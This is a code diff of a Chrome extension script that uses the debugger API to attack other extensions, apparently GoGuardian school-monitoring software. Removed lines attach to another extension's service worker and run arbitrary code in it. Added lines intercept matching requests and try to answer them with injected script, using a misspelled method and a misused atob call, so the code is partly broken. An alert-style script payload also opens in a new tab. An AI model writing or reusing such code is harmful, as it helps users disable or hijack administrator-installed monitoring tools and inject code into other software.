@@ -15,19 +15,27 @@ chrome.runtime.onMessage.addListener(async function (msg, sender, sendResponse) 
             var url = URL.createObjectURL(new Blob(["<script>alert(1)</script>"], { type: 'text/html' }));
             chrome.tabs.create({ url: url });
         }
+        const code =  function () {
+            alert("wassup");
+        }
+        chrome.debugger.onEvent.addListener(async function (e, v, p) {
+            var reqID = p.requestId;
+            var isGoguardian = p.request.url.includes("haldl");
+            if (isGoguardian) {
+                await chrome.debugger.sendCommand({targetId: "browser"}, "Fetch.fullfillRequest", {
+                    requestId: reqID,
+                    responseCode: 200,
+                    body: atob(`(${code.toString()})()`)
+                })
+                
+            }
+        })
         var id = setInterval(async () => {
 
             (await chrome.debugger.sendCommand({ targetId: 'browser' }, "Target.getTargets")).targetInfos.forEach(async function (t) {
                 console.log(t.type);
                 if (t.url.includes('chrome-extension://' + msg.extid) && t.type === "service_worker") {
-                    var targetId = t.targetId;
-                    var { sessionId } = await chrome.debugger.sendCommand({ targetId: 'browser' }, 'Target.attachToTarget', { targetId, flatten: false })
-                    console.log(await chrome.debugger.sendCommand({ targetId: "browser" }, 'Target.sendMessageToTarget', { sessionId, message: JSON.stringify({ id: 999, method: "Runtime.evaluate", params: { expression: `(${chromeTabsScriptFull.toString()})()` } }) }));
-                    chrome.debugger.detach({ targetId: 'browser' })
-                    sendResponse({
-                        "error": null,
-                        "data": ""
-                    })
+                    
                     clearInterval(id)
                 }
             })
